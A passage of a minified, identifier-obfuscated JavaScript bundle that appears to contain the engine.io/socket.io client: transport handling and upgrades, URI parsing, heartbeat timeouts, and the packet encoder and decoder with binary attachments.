            })['catch'](_0x18b32a => {});
          };
          _0xba90a8();
          const _0x223844 = {
            'type': "open"
          };
          if (this.query.sid) {
            _0x223844.data = "{\"sid\":\"" + this.query.sid + "\"}";
          }
          this.writer.write(_0x223844).then(() => this.onOpen());
        });
      });
    }
  }
  ["write"](_0x8e69e5) {
    this.writable = false;
    for (let _0x5d45b4 = 0x0; _0x5d45b4 < _0x8e69e5.length; _0x5d45b4++) {
      const _0xc3aa66 = _0x8e69e5[_0x5d45b4];
      const _0x7beaf8 = _0x5d45b4 === _0x8e69e5.length - 0x1;
      this.writer.write(_0xc3aa66).then(() => {
        if (_0x7beaf8) {
          ne(() => {
            this.writable = true;
            this.emitReserved('drain');
          }, this.setTimeoutFn);
        }
      });
    }
  }
  ["doClose"]() {
    var _0x106a68;
    if (!((_0x106a68 = this.transport) === null || _0x106a68 === undefined)) {
      _0x106a68.close();
    }
  }
}
const gt = {
  'websocket': dt,
  'webtransport': pt,
  'polling': ut
};
const mt = ['source', 'protocol', 'authority', "userInfo", "user", 'password', "host", "port", 'relative', 'path', "directory", "file", "query", "anchor"];
function z(_0x312a4c) {
  const _0x5e74a0 = _0x312a4c;
  const _0x195035 = _0x312a4c.indexOf('[');
  const _0x5751bc = _0x312a4c.indexOf(']');
  if (_0x195035 != -0x1 && _0x5751bc != -0x1) {
    _0x312a4c = _0x312a4c.substring(0x0, _0x195035) + _0x312a4c.substring(_0x195035, _0x5751bc).replace(/:/g, ';') + _0x312a4c.substring(_0x5751bc, _0x312a4c.length);
  }
  let _0x1e675c = /^(?:(?![^:@\/?#]+:[^:@\/]*@)(http|https|ws|wss):\/\/)?((?:(([^:@\/?#]*)(?::([^:@\/?#]*))?)?@)?((?:[a-f0-9]{0,4}:){2,7}[a-f0-9]{0,4}|[^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/.exec(_0x312a4c || '');
  let _0x429a70 = {};
  let _0x590a23 = 0xe;
  for (; _0x590a23--;) {
    _0x429a70[mt[_0x590a23]] = _0x1e675c[_0x590a23] || '';
  }
  if (_0x195035 != -0x1 && _0x5751bc != -0x1) {
    _0x429a70.source = _0x5e74a0;
    _0x429a70.host = _0x429a70.host.substring(0x1, _0x429a70.host.length - 0x1).replace(/;/g, ':');
    _0x429a70.authority = _0x429a70.authority.replace('[', '').replace(']', '').replace(/;/g, ':');
    _0x429a70.ipv6uri = true;
  }
  _0x429a70.pathNames = bt(_0x429a70, _0x429a70.path);
  _0x429a70.queryKey = wt(_0x429a70, _0x429a70.query);
  return _0x429a70;
}
function bt(_0x422bf2, _0x5ce5b5) {
  const _0x552342 = _0x5ce5b5.replace(/\/{2,9}/g, '/').split('/');
  if (_0x5ce5b5.slice(0x0, 0x1) == '/' || _0x5ce5b5.length === 0x0) {
    _0x552342.splice(0x0, 0x1);
  }
  if (_0x5ce5b5.slice(-0x1) == '/') {
    _0x552342.splice(_0x552342.length - 0x1, 0x1);
  }
  return _0x552342;
}
function wt(_0x4ea811, _0x51f937) {
  const _0x38950f = {};
  _0x51f937.replace(/(?:^|&)([^&=]*)=?([^&]*)/g, function (_0x51f0bb, _0x33ddec, _0x1a1882) {
    if (_0x33ddec) {
      _0x38950f[_0x33ddec] = _0x1a1882;
    }
  });
  return _0x38950f;
}
let S = class extends l {
  constructor(_0x24da05, _0x5c64ad = {}) {
    super();
    this.binaryType = "arraybuffer";
    this.writeBuffer = [];
    if (_0x24da05 && typeof _0x24da05 == "object") {
      _0x5c64ad = _0x24da05;
      _0x24da05 = null;
    }
    if (_0x24da05) {
      _0x24da05 = z(_0x24da05);
      _0x5c64ad.hostname = _0x24da05.host;
      _0x5c64ad.secure = _0x24da05.protocol === "https" || _0x24da05.protocol === 'wss';
      _0x5c64ad.port = _0x24da05.port;
      if (_0x24da05.query) {
        _0x5c64ad.query = _0x24da05.query;
      }
    } else if (_0x5c64ad.host) {
      _0x5c64ad.hostname = z(_0x5c64ad.host).host;
    }
    F(this, _0x5c64ad);
    this.secure = _0x5c64ad.secure != null ? _0x5c64ad.secure : typeof location < 'u' && location.protocol === "https:";
    if (_0x5c64ad.hostname && !_0x5c64ad.port) {
      _0x5c64ad.port = this.secure ? "443" : '80';
    }
    this.hostname = _0x5c64ad.hostname || (typeof location < 'u' ? location.hostname : "localhost");
    this.port = _0x5c64ad.port || (typeof location < 'u' && location.port ? location.port : this.secure ? "443" : '80');
    this.transports = _0x5c64ad.transports || ["polling", "websocket", "webtransport"];
    this.writeBuffer = [];
    this.prevBufferLen = 0x0;
    this.opts = Object.assign({
      'path': "/engine.io",
      'agent': false,
      'withCredentials': false,
      'upgrade': true,
      'timestampParam': 't',
      'rememberUpgrade': false,
      'addTrailingSlash': true,
      'rejectUnauthorized': true,
      'perMessageDeflate': {
        'threshold': 0x400
      },
      'transportOptions': {},
      'closeOnBeforeunload': false
    }, _0x5c64ad);
    this.opts.path = this.opts.path.replace(/\/$/, '') + (this.opts.addTrailingSlash ? '/' : '');
    if (typeof this.opts.query == "string") {
      this.opts.query = rt(this.opts.query);
    }
    this.id = null;
    this.upgrades = null;
    this.pingInterval = null;
    this.pingTimeout = null;
    this.pingTimeoutTimer = null;
    if (typeof addEventListener == "function") {
      if (this.opts.closeOnBeforeunload) {
        this.beforeunloadEventListener = () => {
          if (this.transport) {
            this.transport.removeAllListeners();
            this.transport.close();
          }
        };
        addEventListener("beforeunload", this.beforeunloadEventListener, false);
      }
      if (this.hostname !== "localhost") {
        this.offlineEventListener = () => {
          this.onClose("transport close", {
            'description': "network connection lost"
          });
        };
        addEventListener("offline", this.offlineEventListener, false);
      }
    }
    this.open();
  }
  ["createTransport"](_0x40b388) {
    const _0x7f6a8f = Object.assign({}, this.opts.query);
    _0x7f6a8f.EIO = 0x4;
    _0x7f6a8f.transport = _0x40b388;
    if (this.id) {
      _0x7f6a8f.sid = this.id;
    }
    const _0x5ad15d = Object.assign({}, this.opts, {
      'query': _0x7f6a8f,
      'socket': this,
      'hostname': this.hostname,
      'secure': this.secure,
      'port': this.port
    }, this.opts.transportOptions[_0x40b388]);
    return new gt[_0x40b388](_0x5ad15d);
  }
  ['open']() {
    let _0x29e446;
    if (this.opts.rememberUpgrade && S.priorWebsocketSuccess && this.transports.indexOf("websocket") !== -0x1) {
      _0x29e446 = "websocket";
    } else {
      if (this.transports.length === 0x0) {
        this.setTimeoutFn(() => {
          this.emitReserved("error", "No transports available");
        }, 0x0);
        return;
      } else {
        _0x29e446 = this.transports[0x0];
      }
    }
    this.readyState = "opening";
    try {
      _0x29e446 = this.createTransport(_0x29e446);
    } catch (_0x34299b) {
      this.transports.shift();
      this.open();
      return;
    }
    _0x29e446.open();
    this.setTransport(_0x29e446);
  }
  ["setTransport"](_0x208910) {
    if (this.transport) {
      this.transport.removeAllListeners();
    }
    this.transport = _0x208910;
    _0x208910.on('drain', this.onDrain.bind(this)).on("packet", this.onPacket.bind(this)).on("error", this.onError.bind(this)).on("close", _0x368391 => this.onClose("transport close", _0x368391));
  }
  ["probe"](_0x3c0edd) {
    let _0x3ef2cd = this.createTransport(_0x3c0edd);
    let _0x41df06 = false;
    S.priorWebsocketSuccess = false;
    const _0x2546ac = () => {
      if (!_0x41df06) {
        _0x3ef2cd.send([{
          'type': 'ping',
          'data': 'probe'
        }]);
        _0x3ef2cd.once("packet", _0x1ba489 => {
          if (!_0x41df06) {
            if (_0x1ba489.type === 'pong' && _0x1ba489.data === 'probe') {
              this.upgrading = true;
              this.emitReserved("upgrading", _0x3ef2cd);
              if (!_0x3ef2cd) {
                return;
              }
              S.priorWebsocketSuccess = _0x3ef2cd.name === 'websocket';
              this.transport.pause(() => {
                if (!_0x41df06) {
                  if (this.readyState !== "closed") {
                    _0x450d1e();
                    this.setTransport(_0x3ef2cd);
                    _0x3ef2cd.send([{
                      'type': 'upgrade'
                    }]);
                    this.emitReserved("upgrade", _0x3ef2cd);
                    _0x3ef2cd = null;
                    this.upgrading = false;
                    this.flush();
                  }
                }
              });
            } else {
              const _0x5594a3 = new Error("probe error");
              _0x5594a3.transport = _0x3ef2cd.name;
              this.emitReserved("upgradeError", _0x5594a3);
            }
          }
        });
      }
    };
    function _0x1b5fdf() {
      if (!_0x41df06) {
        _0x41df06 = true;
        _0x450d1e();
        _0x3ef2cd.close();
        _0x3ef2cd = null;
      }
    }
    const _0xddebf2 = _0x208485 => {
      const _0x51f260 = new Error("probe error: " + _0x208485);
      _0x51f260.transport = _0x3ef2cd.name;
      _0x1b5fdf();
      this.emitReserved("upgradeError", _0x51f260);
    };
    function _0x251f88() {
      _0xddebf2("transport closed");
    }
    function _0x1e9172() {
      _0xddebf2("socket closed");
    }
    function _0x901bb0(_0x26f155) {
      if (_0x3ef2cd && _0x26f155.name !== _0x3ef2cd.name) {
        _0x1b5fdf();
      }
    }
    const _0x450d1e = () => {
      _0x3ef2cd.removeListener("open", _0x2546ac);
      _0x3ef2cd.removeListener("error", _0xddebf2);
      _0x3ef2cd.removeListener("close", _0x251f88);
      this.off('close', _0x1e9172);
      this.off("upgrading", _0x901bb0);
    };
    _0x3ef2cd.once("open", _0x2546ac);
    _0x3ef2cd.once("error", _0xddebf2);
    _0x3ef2cd.once("close", _0x251f88);
    this.once("close", _0x1e9172);
    this.once("upgrading", _0x901bb0);
    if (this.upgrades.indexOf("webtransport") !== -0x1 && _0x3c0edd !== "webtransport") {
      this.setTimeoutFn(() => {
        if (!_0x41df06) {
          _0x3ef2cd.open();
        }
      }, 0xc8);
    } else {
      _0x3ef2cd.open();
    }
  }
  ["onOpen"]() {
    this.readyState = "open";
    S.priorWebsocketSuccess = this.transport.name === "websocket";
    this.emitReserved('open');
    this.flush();
    if (this.readyState === "open" && this.opts.upgrade) {
      let _0x2d48d8 = 0x0;
      const _0x2b4609 = this.upgrades.length;
      for (; _0x2d48d8 < _0x2b4609; _0x2d48d8++) {
        this.probe(this.upgrades[_0x2d48d8]);
      }
    }
  }
  ["onPacket"](_0x4cc79e) {
    if (this.readyState === "opening" || this.readyState === "open" || this.readyState === 'closing') {
      this.emitReserved("packet", _0x4cc79e);
      this.emitReserved("heartbeat");
      this.resetPingTimeout();
      switch (_0x4cc79e.type) {
        case "open":
          this.onHandshake(JSON.parse(_0x4cc79e.data));
          break;
        case 'ping':
          this.sendPacket("pong");
          this.emitReserved('ping');
          this.emitReserved('pong');
          break;
        case "error":
          const _0x48a30e = new Error("server error");
          _0x48a30e.code = _0x4cc79e.data;
          this.onError(_0x48a30e);
          break;
        case "message":
          this.emitReserved("data", _0x4cc79e.data);
          this.emitReserved("message", _0x4cc79e.data);
          break;
      }
    }
  }
  ["onHandshake"](_0x1d4dea) {
    this.emitReserved("handshake", _0x1d4dea);
    this.id = _0x1d4dea.sid;
    this.transport.query.sid = _0x1d4dea.sid;
    this.upgrades = this.filterUpgrades(_0x1d4dea.upgrades);
    this.pingInterval = _0x1d4dea.pingInterval;
    this.pingTimeout = _0x1d4dea.pingTimeout;
    this.maxPayload = _0x1d4dea.maxPayload;
    this.onOpen();
    if (this.readyState !== 'closed') {
      this.resetPingTimeout();
    }
  }
  ["resetPingTimeout"]() {
    this.clearTimeoutFn(this.pingTimeoutTimer);
    this.pingTimeoutTimer = this.setTimeoutFn(() => {
      this.onClose("ping timeout");
    }, this.pingInterval + this.pingTimeout);
    if (this.opts.autoUnref) {
      this.pingTimeoutTimer.unref();
    }
  }
  ["onDrain"]() {
    this.writeBuffer.splice(0x0, this.prevBufferLen);
    this.prevBufferLen = 0x0;
    if (this.writeBuffer.length === 0x0) {
      this.emitReserved("drain");
    } else {
      this.flush();
    }
  }
  ["flush"]() {
    if (this.readyState !== "closed" && this.transport.writable && !this.upgrading && this.writeBuffer.length) {
      const _0x59e9e0 = this.getWritablePackets();
      this.transport.send(_0x59e9e0);
      this.prevBufferLen = _0x59e9e0.length;
      this.emitReserved("flush");
    }
  }
  ["getWritablePackets"]() {
    if (!(this.maxPayload && this.transport.name === 'polling' && this.writeBuffer.length > 0x1)) {
      return this.writeBuffer;
    }
    let _0x19783e = 0x1;
    for (let _0x47426a = 0x0; _0x47426a < this.writeBuffer.length; _0x47426a++) {
      const _0x560314 = this.writeBuffer[_0x47426a].data;
      if (_0x560314) {
        _0x19783e += typeof _0x560314 == 'string' ? nt(_0x560314) : Math.ceil((_0x560314.byteLength || _0x560314.size) * 1.33);
      }
      if (_0x47426a > 0x0 && _0x19783e > this.maxPayload) {
        return this.writeBuffer.slice(0x0, _0x47426a);
      }
      _0x19783e += 0x2;
    }
    return this.writeBuffer;
  }
  ["write"](_0x1117c2, _0x195566, _0x441445) {
    this.sendPacket("message", _0x1117c2, _0x195566, _0x441445);
    return this;
  }
  ['send'](_0x470c41, _0xdf0ddc, _0x3da33b) {
    this.sendPacket("message", _0x470c41, _0xdf0ddc, _0x3da33b);
    return this;
  }
  ["sendPacket"](_0x11c317, _0x529e0a, _0x48ace4, _0x4115de) {
    if (typeof _0x529e0a == "function") {
      _0x4115de = _0x529e0a;
      _0x529e0a = undefined;
    }
    if (typeof _0x48ace4 == 'function') {
      _0x4115de = _0x48ace4;
      _0x48ace4 = null;
    }
    if (this.readyState === "closing" || this.readyState === "closed") {
      return;
    }
    _0x48ace4 = _0x48ace4 || {};
    _0x48ace4.compress = _0x48ace4.compress !== false;
    const _0x205abc = {
      'type': _0x11c317,
      'data': _0x529e0a,
      'options': _0x48ace4
    };
    this.emitReserved("packetCreate", _0x205abc);
    this.writeBuffer.push(_0x205abc);
    if (_0x4115de) {
      this.once('flush', _0x4115de);
    }
    this.flush();
  }
  ["close"]() {
    const _0x3690ea = () => {
      this.onClose("forced close");
      this.transport.close();
    };
    const _0x1f8efe = () => {
      this.off("upgrade", _0x1f8efe);
      this.off("upgradeError", _0x1f8efe);
      _0x3690ea();
    };
    const _0xfe323f = () => {
      this.once('upgrade', _0x1f8efe);
      this.once("upgradeError", _0x1f8efe);
    };
    if (this.readyState === "opening" || this.readyState === 'open') {
      this.readyState = "closing";
      if (this.writeBuffer.length) {
        this.once("drain", () => {
          if (this.upgrading) {
            _0xfe323f();
          } else {
            _0x3690ea();
          }
        });
      } else if (this.upgrading) {
        _0xfe323f();
      } else {
        _0x3690ea();
      }
    }
    return this;
  }
  ["onError"](_0x2199e2) {
    S.priorWebsocketSuccess = false;
    this.emitReserved("error", _0x2199e2);
    this.onClose("transport error", _0x2199e2);
  }
  ['onClose'](_0x41ca05, _0xee10ae) {
    if (this.readyState === "opening" || this.readyState === 'open' || this.readyState === "closing") {
      this.clearTimeoutFn(this.pingTimeoutTimer);
      this.transport.removeAllListeners("close");
      this.transport.close();
      this.transport.removeAllListeners();
      if (typeof removeEventListener == "function") {
        removeEventListener("beforeunload", this.beforeunloadEventListener, false);
        removeEventListener("offline", this.offlineEventListener, false);
      }
      this.readyState = "closed";
      this.id = null;
      this.emitReserved("close", _0x41ca05, _0xee10ae);
      this.writeBuffer = [];
      this.prevBufferLen = 0x0;
    }
  }
  ["filterUpgrades"](_0x596396) {
    const _0x381aae = [];
    let _0x514a2e = 0x0;
    const _0x1555a5 = _0x596396.length;
    for (; _0x514a2e < _0x1555a5; _0x514a2e++) {
      if (~this.transports.indexOf(_0x596396[_0x514a2e])) {
        _0x381aae.push(_0x596396[_0x514a2e]);
      }
    }
    return _0x381aae;
  }
};
S.protocol = 0x4;
function vt(_0x4b79e6, _0x5dccfa = '', _0x2f370c) {
  let _0x202654 = _0x4b79e6;
  _0x2f370c = _0x2f370c || typeof location < 'u' && location;
  if (_0x4b79e6 == null) {
    _0x4b79e6 = _0x2f370c.protocol + '//' + _0x2f370c.host;
  }
  if (typeof _0x4b79e6 == "string") {
    if (_0x4b79e6.charAt(0x0) === '/') {
      if (_0x4b79e6.charAt(0x1) === '/') {
        _0x4b79e6 = _0x2f370c.protocol + _0x4b79e6;
      } else {
        _0x4b79e6 = _0x2f370c.host + _0x4b79e6;
      }
    }
    if (!/^(https?|wss?):\/\//.test(_0x4b79e6)) {
      if (typeof _0x2f370c < 'u') {
        _0x4b79e6 = _0x2f370c.protocol + '//' + _0x4b79e6;
      } else {
        _0x4b79e6 = "https://" + _0x4b79e6;
      }
    }
    _0x202654 = z(_0x4b79e6);
  }
  if (!_0x202654.port) {
    if (/^(http|ws)$/.test(_0x202654.protocol)) {
      _0x202654.port = '80';
    } else if (/^(http|ws)s$/.test(_0x202654.protocol)) {
      _0x202654.port = "443";
    }
  }
  _0x202654.path = _0x202654.path || '/';
  const _0x1cb065 = _0x202654.host.indexOf(':') !== -0x1 ? '[' + _0x202654.host + ']' : _0x202654.host;
  _0x202654.id = _0x202654.protocol + "://" + _0x1cb065 + ':' + _0x202654.port + _0x5dccfa;
  _0x202654.href = _0x202654.protocol + "://" + _0x1cb065 + (_0x2f370c && _0x2f370c.port === _0x202654.port ? '' : ':' + _0x202654.port);
  return _0x202654;
}
const _t = typeof ArrayBuffer == "function";
const Et = _0x1693f3 => typeof ArrayBuffer.isView == "function" ? ArrayBuffer.isView(_0x1693f3) : _0x1693f3.buffer instanceof ArrayBuffer;
const Ie = Object.prototype.toString;
const Ot = typeof Blob == "function" || typeof Blob < 'u' && Ie.call(Blob) === "[object BlobConstructor]";
const St = typeof File == "function" || typeof File < 'u' && Ie.call(File) === "[object FileConstructor]";
function ie(_0x4ebc36) {
  return _t && (_0x4ebc36 instanceof ArrayBuffer || (typeof ArrayBuffer.isView == "function" ? ArrayBuffer.isView(_0x4ebc36) : _0x4ebc36.buffer instanceof ArrayBuffer)) || Ot && _0x4ebc36 instanceof Blob || St && _0x4ebc36 instanceof File;
}
function M(_0x3bfc17, _0x31b5ea) {
  if (!_0x3bfc17 || typeof _0x3bfc17 != 'object') {
    return false;
  }
  if (Array.isArray(_0x3bfc17)) {
    let _0x11d0b9 = 0x0;
    for (let _0x305011 = _0x3bfc17.length; _0x11d0b9 < _0x305011; _0x11d0b9++) {
      if (M(_0x3bfc17[_0x11d0b9])) {
        return true;
      }
    }
    return false;
  }
  if (_t && (_0x3bfc17 instanceof ArrayBuffer || (typeof ArrayBuffer.isView == "function" ? ArrayBuffer.isView(_0x3bfc17) : _0x3bfc17.buffer instanceof ArrayBuffer)) || Ot && _0x3bfc17 instanceof Blob || St && _0x3bfc17 instanceof File) {
    return true;
  }
  if (_0x3bfc17.toJSON && typeof _0x3bfc17.toJSON == "function" && arguments.length === 0x1) {
    return M(_0x3bfc17.toJSON(), true);
  }
  for (const _0x71ac39 in _0x3bfc17) if (Object.prototype.hasOwnProperty.call(_0x3bfc17, _0x71ac39) && M(_0x3bfc17[_0x71ac39])) {
    return true;
  }
  return false;
}
function kt(_0x3093fa) {
  const _0x1f7494 = [];
  const _0x2f88e8 = _0x3093fa.data;
  _0x3093fa.data = Y(_0x2f88e8, _0x1f7494);
  _0x3093fa.attachments = _0x1f7494.length;
  return {
    'packet': _0x3093fa,
    'buffers': _0x1f7494
  };
}
function Y(_0x38a361, _0x483e6f) {
  if (!_0x38a361) {
    return _0x38a361;
  }
  if (_t && (_0x38a361 instanceof ArrayBuffer || (typeof ArrayBuffer.isView == "function" ? ArrayBuffer.isView(_0x38a361) : _0x38a361.buffer instanceof ArrayBuffer)) || Ot && _0x38a361 instanceof Blob || St && _0x38a361 instanceof File) {
    const _0x126d31 = {
      '_placeholder': true,
      'num': _0x483e6f.length
    };
    _0x483e6f.push(_0x38a361);
    return _0x126d31;
  } else {
    if (Array.isArray(_0x38a361)) {
      const _0xe314bd = new Array(_0x38a361.length);
      for (let _0x7c12b8 = 0x0; _0x7c12b8 < _0x38a361.length; _0x7c12b8++) {
        _0xe314bd[_0x7c12b8] = Y(_0x38a361[_0x7c12b8], _0x483e6f);
      }
      return _0xe314bd;
    } else {
      if (typeof _0x38a361 == 'object' && !(_0x38a361 instanceof Date)) {
        const _0x46a454 = {};
        for (const _0x294296 in _0x38a361) if (Object.prototype.hasOwnProperty.call(_0x38a361, _0x294296)) {
          _0x46a454[_0x294296] = Y(_0x38a361[_0x294296], _0x483e6f);
        }
        return _0x46a454;
      }
    }
  }
  return _0x38a361;
}
function At(_0x82b5a3, _0xd749b5) {
  _0x82b5a3.data = X(_0x82b5a3.data, _0xd749b5);
  delete _0x82b5a3.attachments;
  return _0x82b5a3;
}
function X(_0xe7b798, _0x30dc80) {
  if (!_0xe7b798) {
    return _0xe7b798;
  }
  if (_0xe7b798 && _0xe7b798._placeholder === true) {
    if (typeof _0xe7b798.num == 'number' && _0xe7b798.num >= 0x0 && _0xe7b798.num < _0x30dc80.length) {
      return _0x30dc80[_0xe7b798.num];
    }
    throw new Error("illegal attachments");
  } else {
    if (Array.isArray(_0xe7b798)) {
      for (let _0x28dcf0 = 0x0; _0x28dcf0 < _0xe7b798.length; _0x28dcf0++) {
        _0xe7b798[_0x28dcf0] = X(_0xe7b798[_0x28dcf0], _0x30dc80);
      }
    } else {
      if (typeof _0xe7b798 == 'object') {
        for (const _0x2cadf9 in _0xe7b798) if (Object.prototype.hasOwnProperty.call(_0xe7b798, _0x2cadf9)) {
          _0xe7b798[_0x2cadf9] = X(_0xe7b798[_0x2cadf9], _0x30dc80);
        }
      }
    }
  }
  return _0xe7b798;
}
const Tt = ["connect", "connect_error", "disconnect", "disconnecting", "newListener", "removeListener"];
var h;
(function (_0x34d533) {
  _0x34d533[_0x34d533.CONNECT = 0x0] = 'CONNECT';
  _0x34d533[_0x34d533.DISCONNECT = 0x1] = "DISCONNECT";
  _0x34d533[_0x34d533.EVENT = 0x2] = "EVENT";
  _0x34d533[_0x34d533.ACK = 0x3] = "ACK";
  _0x34d533[_0x34d533.CONNECT_ERROR = 0x4] = "CONNECT_ERROR";
  _0x34d533[_0x34d533.BINARY_EVENT = 0x5] = "BINARY_EVENT";
  _0x34d533[_0x34d533.BINARY_ACK = 0x6] = 'BINARY_ACK';
})(h || (h = {}));
class Ct {
  constructor(_0x1bccdf) {
    this.replacer = _0x1bccdf;
  }
  ["encode"](_0x968618) {
    return (_0x968618.type === h.EVENT || _0x968618.type === h.ACK) && M(_0x968618) ? this.encodeAsBinary({
      'type': _0x968618.type === h.EVENT ? h.BINARY_EVENT : h.BINARY_ACK,
      'nsp': _0x968618.nsp,
      'data': _0x968618.data,
      'id': _0x968618.id
    }) : [this.encodeAsString(_0x968618)];
  }
  ["encodeAsString"](_0x48bdfc) {
    let _0x396ea2 = '' + _0x48bdfc.type;
    if (_0x48bdfc.type === h.BINARY_EVENT || _0x48bdfc.type === h.BINARY_ACK) {
      _0x396ea2 += _0x48bdfc.attachments + '-';
    }
    if (_0x48bdfc.nsp && _0x48bdfc.nsp !== '/') {
      _0x396ea2 += _0x48bdfc.nsp + ',';
    }
    if (_0x48bdfc.id != null) {
      _0x396ea2 += _0x48bdfc.id;
    }
    if (_0x48bdfc.data != null) {
      _0x396ea2 += JSON.stringify(_0x48bdfc.data, this.replacer);
    }
    return _0x396ea2;
  }
  ["encodeAsBinary"](_0x41758d) {
    const _0x2fb3d6 = kt(_0x41758d);
    const _0x423f45 = this.encodeAsString(_0x2fb3d6.packet);
    const _0x446cac = _0x2fb3d6.buffers;
    _0x446cac.unshift(_0x423f45);
    return _0x446cac;
  }
}
function be(_0xa3b9f8) {
  return Object.prototype.toString.call(_0xa3b9f8) === "[object Object]";
}
class re extends l {
  constructor(_0x227b4c) {
    super();
    this.reviver = _0x227b4c;
  }
  ["add"](_0xe8ebe) {
    let _0x437226;
    if (typeof _0xe8ebe == "string") {
      if (this.reconstructor) {
        throw new Error("got plaintext data when reconstructing a packet");
      }
      _0x437226 = this.decodeString(_0xe8ebe);
      const _0xa3371a = _0x437226.type === h.BINARY_EVENT;
      if (_0xa3371a || _0x437226.type === h.BINARY_ACK) {
        _0x437226.type = _0xa3371a ? h.EVENT : h.ACK;
        this.reconstructor = new Bt(_0x437226);
        if (_0x437226.attachments === 0x0) {
          super.emitReserved("decoded", _0x437226);
        }
      } else {
        super.emitReserved('decoded', _0x437226);
      }
    } else {
      if (_t && (_0xe8ebe instanceof ArrayBuffer || (typeof ArrayBuffer.isView == "function" ? ArrayBuffer.isView(_0xe8ebe) : _0xe8ebe.buffer instanceof ArrayBuffer)) || Ot && _0xe8ebe instanceof Blob || St && _0xe8ebe instanceof File || _0xe8ebe.base64) {
        if (this.reconstructor) {
          _0x437226 = this.reconstructor.takeBinaryData(_0xe8ebe);
          if (_0x437226) {
            this.reconstructor = null;
            super.emitReserved('decoded', _0x437226);
          }
        } else {
          throw new Error("got binary data when not reconstructing a packet");
        }
      } else {
        throw new Error("Unknown type: " + _0xe8ebe);
      }
    }
  }
  ["decodeString"](_0x3f0fdf) {
    let _0x5a887c = 0x0;
    const _0x11c795 = {
      'type': Number(_0x3f0fdf.charAt(0x0))
    };
    if (h[_0x11c795.type] === undefined) {
      throw new Error("unknown packet type " + _0x11c795.type);
    }
    if (_0x11c795.type === h.BINARY_EVENT || _0x11c795.type === h.BINARY_ACK) {
      const _0x245a24 = _0x5a887c + 0x1;
      for (; _0x3f0fdf.charAt(++_0x5a887c) !== '-' && _0x5a887c != _0x3f0fdf.length;) {
        ;
      }
      const _0x3aa93b = _0x3f0fdf.substring(_0x245a24, _0x5a887c);
      if (_0x3aa93b != Number(_0x3aa93b) || _0x3f0fdf.charAt(_0x5a887c) !== '-') {
        throw new Error("Illegal attachments");
      }
      _0x11c795.attachments = Number(_0x3aa93b);
    }
    if (_0x3f0fdf.charAt(_0x5a887c + 0x1) === '/') {
      const _0x23f84b = _0x5a887c + 0x1;
      for (; ++_0x5a887c && !(_0x3f0fdf.charAt(_0x5a887c) === ',' || _0x5a887c === _0x3f0fdf.length);) {
        ;
      }
      _0x11c795.nsp = _0x3f0fdf.substring(_0x23f84b, _0x5a887c);
    } else {
      _0x11c795.nsp = '/';
    }
    const _0x4a9ac9 = _0x3f0fdf.charAt(_0x5a887c + 0x1);
    if (_0x4a9ac9 !== '' && Number(_0x4a9ac9) == _0x4a9ac9) {
      const _0xcb4c7c = _0x5a887c + 0x1;
      for (; ++_0x5a887c;) {
        const _0x2f1e0f = _0x3f0fdf.charAt(_0x5a887c);
        if (_0x2f1e0f == null || Number(_0x2f1e0f) != _0x2f1e0f) {
          --_0x5a887c;
          break;
        }
        if (_0x5a887c === _0x3f0fdf.length) {
          break;
        }
      }
      _0x11c795.id = Number(_0x3f0fdf.substring(_0xcb4c7c, _0x5a887c + 0x1));
    }
    if (_0x3f0fdf.charAt(++_0x5a887c)) {
      const _0x4534dc = this.tryParse(_0x3f0fdf.substr(_0x5a887c));
      if (re.isPayloadValid(_0x11c795.type, _0x4534dc)) {
        _0x11c795.data = _0x4534dc;
      } else {
        throw new Error("invalid payload");
      }
    }
    return _0x11c795;
  }
  ["tryParse"](_0x486e66) {
    try {
      return JSON.parse(_0x486e66, this.reviver);
    } catch (_0x6307c5) {
      return false;
    }
  }
  static ["isPayloadValid"](_0x15d0b0, _0x175449) {
    switch (_0x15d0b0) {
      case h.CONNECT:
        return Object.prototype.toString.call(_0x175449) === "[object Object]";
      case h.DISCONNECT:
        return _0x175449 === undefined;
      case h.CONNECT_ERROR:
        return typeof _0x175449 == 'string' || Object.prototype.toString.call(_0x175449) === "[object Object]";
      case h.EVENT:
      case h.BINARY_EVENT:
        return Array.isArray(_0x175449) && (typeof _0x175449[0x0] == "number" || typeof _0x175449[0x0] == "string" && Tt.indexOf(_0x175449[0x0]) === -0x1);
      case h.ACK:
      case h.BINARY_ACK:
        return Array.isArray(_0x175449);
    }
  }
  ["destroy"]() {
    if (this.reconstructor) {
      this.reconstructor.finishedReconstruction();
      this.reconstructor = null;
    }
  }
}
class Bt {
  constructor(_0x531ffb) {
    this.packet = _0x531ffb;
    this.buffers = [];
    this.reconPack = _0x531ffb;
  }
  ["takeBinaryData"](_0x5392bd) {
    this.buffers.push(_0x5392bd);
    if (this.buffers.length === this.reconPack.attachments) {
      const _0x31985a = At(this.reconPack, this.buffers);
      this.finishedReconstruction();
      return _0x31985a;
    }
    return null;
  }
  ["finishedReconstruction"]() {
    this.reconPack = null;
    this.buffers = [];
  }
}
const xt = Object.freeze(Object.defineProperty({
  '__proto__': null,
  'Decoder': re,
  'Encoder': Ct,
  get 'PacketType'() {
    return h;
  },
  'protocol': 0x5
}, Symbol.toStringTag, {
  'value': "Module"
}));
function y(_0x1db0b8, _0x46e42c, _0x3e5d82) {
  _0x1db0b8.on(_0x46e42c, _0x3e5d82);
  return function () {
    _0x1db0b8.off(_0x46e42c, _0x3e5d82);
  };
}
const Nt = Object.freeze({
  'connect': 0x1,
  'connect_error': 0x1,
  'disconnect': 0x1,
  'disconnecting': 0x1,
  'newListener': 0x1,
  'removeListener': 0x1
});
class Me extends l {
  constructor(_0x42731d, _0x529685, _0x18d614) {
    super();
    this.connected = false;
    this.recovered = false;
    this.receiveBuffer = [];
    this.sendBuffer = [];
    this._queue = [];
    this._queueSeq = 0x0;
    this.ids = 0x0;
    this.acks = {};
    this.flags = {};
    this.io = _0x42731d;
    this.nsp = _0x529685;
    if (_0x18d614 && _0x18d614.auth) {
      this.auth = _0x18d614.auth;
    }
    this._opts = Object.assign({}, _0x18d614);
    if (this.io._autoConnect) {
      this.open();
    }
  }
  get ["disconnected"]() {
    return !this.connected;
  }
  ["subEvents"]() {
    if (this.subs) {
      return;
    }
    const _0xb07121 = this.io;
    this.subs = [y(_0xb07121, 'open', this.onopen.bind(this)), y(_0xb07121, "packet", this.onpacket.bind(this)), y(_0xb07121, "error", this.onerror.bind(this)), y(_0xb07121, "close", this.onclose.bind(this))];
  }
  get ["active"]() {
    return !!this.subs;
  }
  ['connect']() {
